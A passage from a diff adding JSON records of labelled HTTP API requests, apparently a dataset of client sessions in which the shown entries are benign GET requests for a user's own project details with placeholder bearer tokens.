+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token_90"
+        },
+        "body": null,
+        "note": "The client views project details."
+      },
+      {
+        "id": "sess190-s05",
+        "label": "benign",
+        "method": "GET",
+        "path": "/projects/proj_91",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token_90"
+        },
+        "body": null,
+        "note": "The client checks a second owned project."
+      }
+    ]
+  }
+]
